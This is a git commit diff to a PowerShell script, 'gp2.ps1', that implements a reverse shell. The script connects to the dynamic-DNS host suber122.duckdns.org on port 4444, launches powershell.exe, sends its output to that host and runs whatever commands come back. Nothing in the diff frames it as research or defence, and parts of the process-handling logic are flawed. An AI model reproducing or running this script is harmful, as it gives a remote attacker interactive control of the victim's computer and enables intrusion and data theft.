100be685155e3966a66ed47e61412b1ee481bc74
anilxpm <116901345+anilxpm@users.noreply.github.com>
2023-04-16 08:52:59 +0300

    Update gp2.ps1

--- gp2.ps1
+++ gp2.ps1
@@ -1,20 +1,36 @@
 $ip = "suber122.duckdns.org"
-$port = 4444
-$sendCommand = "cmd.exe"
-
-$socket = New-Object System.Net.Sockets.TcpClient($ip,$port)
+$port = "4444"
+$socket = New-Object Net.Sockets.TcpClient($ip,$port)
 $stream = $socket.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
 $reader = New-Object System.IO.StreamReader($stream)
-
-$writer.WriteLine($sendCommand)
-$writer.Flush()
-
-$output = $reader.ReadLine()
-
-while($output -ne $null){
-    $output
-    $output = $reader.ReadLine()
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+$shell = "powershell.exe"
+$proc = [System.Diagnostics.Process]::Start($shell)
+$cmds = $proc.StartInfo.RedirectStandardError = $true
+$proc.StartInfo.RedirectStandardInput = $true
+$proc.StartInfo.RedirectStandardOutput = $true
+$proc.StartInfo.UseShellExecute = $false
+$proc.Start()
+while($proc.ExitCode -eq $null){
+  Start-Sleep 1
 }
-
+while(!$socket.Connected){
+  Start-Sleep 1
+}
+while($socket.Connected){
+  try{
+    $output = $proc.StandardOutput.ReadLine() 
+    $err = $proc.StandardError.ReadLine() 
+    $writer.WriteLine($output) 
+    $writer.WriteLine($err) 
+    $writer.Flush()
+    $input = $reader.ReadLine() 
+    $proc.StandardInput.WriteLine($input) 
+    $proc.StandardInput.Flush() 
+  }catch{
+    break
+  }
+}
 $socket.Close()
+$proc.Close()
